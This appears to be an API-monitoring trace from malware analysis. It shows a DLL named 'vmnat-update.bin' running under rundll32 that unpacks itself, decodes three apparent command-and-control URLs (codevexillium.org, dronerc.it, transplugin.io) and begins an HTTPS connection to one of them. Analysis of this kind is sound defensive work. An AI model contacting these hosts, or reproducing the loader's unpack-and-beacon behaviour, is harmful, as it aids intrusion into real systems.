+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D1DE ("InternetSetOptionW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D1CA ("HttpSendRequestW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D1B6 ("InternetConnectW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D1A2 ("InternetReadFile")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D18E ("InternetCrackUrlW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D170 ("InternetQueryDataAvailable")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D15E ("HttpQueryInfoA")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D146 ("DeleteUrlCacheEntryW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D136 ("InternetOpenW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B4BD0000 ("WININET.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D1F4 ("HttpAddRequestHeadersW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x000000018005CBC4
+[PAR] UINT_PTR    ucb : 0x14
+[RET] 0x7ff9aa0d19ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000018005D276 ("urlmon.dll")
+[RET] 0x7ff9aa0d1926
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000457D4B0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000457D4B0B00
+[PAR] SIZE_T Size        : 0x20
+[RET] 0x7ff9aa0e643f in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9B53C0000 ("urlmon.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D260 ("ObtainUserAgentString")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x000000018005CBD8
+[PAR] UINT_PTR    ucb : 0x14
+[RET] 0x7ff9aa0d19ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000018005D7C0 ("ADVAPI32.dll")
+[RET] 0x7ff9aa0d1926
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <RtlReAllocateHeap> in [ntdll.dll] 
+[PAR] PVOID  HeapHandle  : 0x000000457D4B0000
+[PAR] ULONG  Flags       : 0x0 
+[PAR] PVOID  BaseAddress : 0x000000457D4B0B00
+[PAR] SIZE_T Size        : 0x28
+[RET] 0x7ff9aa0e643f in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCDF0000 ("ADVAPI32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D79A ("ReportEventW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCDF0000 ("ADVAPI32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D782 ("DeregisterEventSource")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9BCDF0000 ("ADVAPI32.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018005D7AA ("RegisterEventSourceW")
+[RET] 0x7ff9aa0d19a6 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x000000018005CBEC
+[PAR] UINT_PTR    ucb : 0x14
+[RET] 0x7ff9aa0d19ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualProtect> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0000000180001000
+[PAR] SIZE_T dwSize       : 0x42a00
+[PAR] DWORD  flNewProtect : 0x20 (PAGE_EXECUTE_READ)
+[RET] 0x7ff9aa0d17ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualProtect> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0000000180044000
+[PAR] SIZE_T dwSize       : 0x19a00
+[PAR] DWORD  flNewProtect : 0x2 (PAGE_READONLY)
+[RET] 0x7ff9aa0d17ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualProtect> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x000000018005E000
+[PAR] SIZE_T dwSize       : 0x10800
+[PAR] DWORD  flNewProtect : 0x4 (PAGE_READWRITE)
+[RET] 0x7ff9aa0d17ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualProtect> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000001800A6000
+[PAR] SIZE_T dwSize       : 0x3c00
+[PAR] DWORD  flNewProtect : 0x2 (PAGE_READONLY)
+[RET] 0x7ff9aa0d17ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualProtect> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000001800AA000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flNewProtect : 0x2 (PAGE_READONLY)
+[RET] 0x7ff9aa0d17ce in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <VirtualFree> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress  : 0x00000001800AB000
+[PAR] SIZE_T dwSize     : 0x3800
+[PAR] DWORD  dwFreeType : 0x4000 (MEM_DECOMMIT)
+[RET] 0x7ff9aa0d1778 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[PAR] LPFILETIME lpSystemTimeAsFileTime : 0x000000457D00D6F0
+[RET] 0x18003ca19
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCurrentProcessId> in [KERNEL32.DLL] 
+[RET] 0x18003ca24
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <QueryPerformanceCounter> in [KERNEL32.DLL] 
+[RET] 0x18003ca4d
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <HeapCreate> in [KERNEL32.DLL] 
+[PAR] DWORD  flOptions     : 0x0 
+[PAR] SIZE_T dwInitialSize : 0x1000
+[PAR] SIZE_T dwMaximumSize : 0x0
+[RET] 0x1800352cc
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetVersion> in [KERNEL32.DLL] 
+[RET] 0x1800352de
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCommandLineA> in [KERNEL32.DLL] 
+[RET] 0x1800327bd
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetEnvironmentStringsW> in [KERNEL32.DLL] 
+[RET] 0x18003c6b3
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D1A31E0
+[PAR] int     cchWideChar       : 0x4f5
+[PAR] LPSTR   lpMultiByteStr    : 0x0
+[PAR] int     cbMultiByte       : 0x0
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x18003c70a
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D1A31E0
+[PAR] int     cchWideChar       : 0x4f5
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457F180B00
+[PAR] int     cbMultiByte       : 0x4f5
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x18003c745
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <FreeEnvironmentStringsW> in [KERNEL32.DLL] 
+[PAR] LPWCH penv : 0x000000457D1A31E0
+[STR]       -> "=C:=C:\Users\user\Desktop\google"
+[RET] 0x18003c75d
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetStartupInfoW> in [KERNEL32.DLL] 
+[PAR] LPSTARTUPINFOW lpStartupInfo : 0x000000457D00D620
+[RET] 0x18003a663
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <SetHandleCount> in [KERNEL32.DLL] 
+[PAR] UINT count : 0x20 
+[RET] 0x18003a8ee
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetACP> in [KERNEL32.DLL] 
+[RET] 0x18003692a
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <IsValidCodePage> in [KERNEL32.DLL] 
+[RET] 0x1800369e9
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x1800369fe
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x180036664
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00D070
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x18003ea48
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00D070
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D00CD50
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x18003eaf4
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetStringTypeW> in [KERNEL32.DLL] 
+[RET] 0x18003eb0b
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00D070
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x18003e724
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00D070
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D00CD40
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x18003e7c1
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x18003e7e8
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x18003e8c2
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D00CB30
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457D00D170
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x18003e902
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00D070
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x18003e724
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D00D070
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D00CD40
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x18003e7c1
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x18003e7e8
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <LCMapStringW> in [KERNEL32.DLL] 
+[RET] 0x18003e8c2
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D00CB30
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457D00D270
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x18003e902
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <GetModuleFileNameA> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : NULL. (Try to get current .exe's path)
+[PAR] LPSTR   lpFilename : 0x00000001800700D0
+[PAR] DWORD   nSize      : 0x104
+[RET] 0x18003c5d8
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <CreateThread> in [KERNEL32.DLL] 
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress  : 0x00000001800051F0 
+[PAR] LPVOID                 lpParameter     : 0x000000457D19D250
+[PAR] DWORD                  dwCreationFlags : 0x0
+[RET] 0x1800055e7
+
+Thread created by monitored process : Now monitoring [pid 0xb68][tid 0xb9c]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x11c
+[RET] 0x1800055f6
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <FreeLibraryAndExitThread> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0d3c56 in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <LocalFree> in [KERNEL32.DLL] 
+[RET] 0x1800052ef
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x200 (WC_COMPOSITECHECK)
+[PAR] LPCWSTR lpWideCharStr     : 0x000000457D49E830
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x000000457D49E6D0
+[PAR] int     cbMultiByte       : 0x4
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x18000326b
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <FlsFree> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0ed30d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xba4] c:\windows\system32\rundll32.exe
+[API] <HeapDestroy> in [KERNEL32.DLL] 
+[RET] 0x7ff9aa0e9e5d in [vmnat-update.bin]
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x0 (CP_ACP)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D49F240
+[STR]        -> "https://codevexillium.org/image/download/download.asp"
+[PAR] int    cbMultiByte    : 0xffffffff
+[PAR] LPWSTR lpWideCharStr  : 0x00000001800A23F0
+[PAR] int    cchWideChar    : 0x35
+[RET] 0x1800053d9
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x0 (CP_ACP)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D49EA40
+[STR]        -> "https://www.dronerc.it/shop_testbr/upload/upload.php"
+[PAR] int    cbMultiByte    : 0xffffffff
+[PAR] LPWSTR lpWideCharStr  : 0x00000001800A2BF0
+[PAR] int    cchWideChar    : 0x34
+[RET] 0x180005414
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x0 (CP_ACP)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D49EE40
+[STR]        -> "https://transplugin.io/upload/upload.asp"
+[PAR] int    cbMultiByte    : 0xffffffff
+[PAR] LPWSTR lpWideCharStr  : 0x00000001800A33F0
+[PAR] int    cchWideChar    : 0x28
+[RET] 0x18000544f
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <GetSystemTimeAsFileTime> in [KERNEL32.DLL] 
+[PAR] LPFILETIME lpSystemTimeAsFileTime : 0x000000457D49E220
+[RET] 0x180032734
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <GetTimeZoneInformation> in [KERNEL32.DLL] 
+[PAR] LPTIME_ZONE_INFORMATION lpTimeZoneInformation : 0x000000018006FDD0
+[RET] 0x180037abf
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000018006FDD4
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x000000018006DBD0
+[PAR] int     cbMultiByte       : 0x3f
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x000000457D49E178
+[RET] 0x180037b75
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000018006FE28
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x000000018006DC10
+[PAR] int     cbMultiByte       : 0x3f
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x000000457D49E178
+[RET] 0x180037bc8
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCanonicalizeUrlW> in [WININET.dll] 
+[PAR] LPCWSTR lpszUrl          : 0x000000457D49F640
+[STR]         -> "https://www.dronerc.it/shop_testbr/upload/upload.php"
+[PAR] LPTSTR  lpszBuffer (out) : 0x000000457D49C740
+[PAR] LPDWORD lpdwBufferLength : 0x000000457D49C2D8
+[PAR] DWORD   dwFlags          : 0x3e000000
+[RET] 0x1800028a0
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetCrackUrlW> in [WININET.dll] 
+[PAR] LPCWSTR          lpszUrl	     : 0x000000457D49C740
+[STR]                  -> "https://www.dronerc.it/shop_testbr/upload/upload.php"
+[PAR] DWORD            dwUrlLength     : 0x34
+[PAR] DWORD            dwFlags         : 0x0
+[PAR] LPURL_COMPONENTS lpUrlComponents : 0x000000457D49C2E0
+[RET] 0x1800028cc
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <ObtainUserAgentString> in [urlmon.dll] 
+[PAR] DWORD  dwOption : 0x0
+[PAR] LPSTR  pszUAOut : 0x000000457D49C350
+[PAR] DWORD* cbSize   : 0x000000457D49C2DC
+[RET] 0x1800028fa
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x0 (CP_ACP)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000457D49C350
+[STR]        -> "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)"
+[PAR] int    cbMultiByte    : 0xffffffff
+[PAR] LPWSTR lpWideCharStr  : 0x000000457D49D150
+[PAR] int    cchWideChar    : 0x5f
+[RET] 0x18000292f
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetOpenW> in [WININET.dll] 
+[PAR] LPCWSTR lpszAgent       : 0x000000457D49D150
+[STR]         -> "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)"
+[PAR] DWORD   dwAccessType    : 0x0 (INTERNET_OPEN_TYPE_PRECONFIG)
+[PAR] LPCWSTR lpszProxyName   : 0x0 (null)
+[PAR] LPCWSTR lpszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0 
+[RET] 0x180002948
+
+Thread created by monitored process : Now monitoring [pid 0xb68][tid 0xbb4]
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0004
+[PAR] DWORD     dwOption       : 0x2 (INTERNET_OPTION_CONNECT_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002975
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0004
+[PAR] DWORD     dwOption       : 0x5 (INTERNET_OPTION_SEND_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x180002996
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetSetOptionW> in [WININET.dll] 
+[PAR] HINTERNET hInternet      : 0xcc0004
+[PAR] DWORD     dwOption       : 0x6 (INTERNET_OPTION_RECEIVE_TIMEOUT)
+[PAR] LPVOID    lpBuffer       : 0x000000457D49C2D0
+[PAR] DWORD     dwBufferLength : 0x4
+[RET] 0x1800029b7
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <DeleteUrlCacheEntryW> in [WININET.dll] 
+[PAR] LPCWSTR lpszUrlName : 0x000000457D49F640
+[STR]         -> "https://www.dronerc.it/shop_testbr/upload/upload.php"
+[RET] 0x1800029c0
+
+Thread created by monitored process : Now monitoring [pid 0xb68][tid 0xbb0]
+
+Thread created by monitored process : Now monitoring [pid 0xb68][tid 0xbec]
+
+[ * ] [pid 0xb68][tid 0xb9c] c:\windows\system32\rundll32.exe
+[API] <InternetConnectW> in [WININET.dll] 
+[PAR] HINTERNET     hInternet      : 0xcc0004
+[PAR] LPCWSTR       lpszServerName : 0x000000457D49CF40 ("www.dronerc.it")
+[PAR] INTERNET_PORT nServerPort    : 443
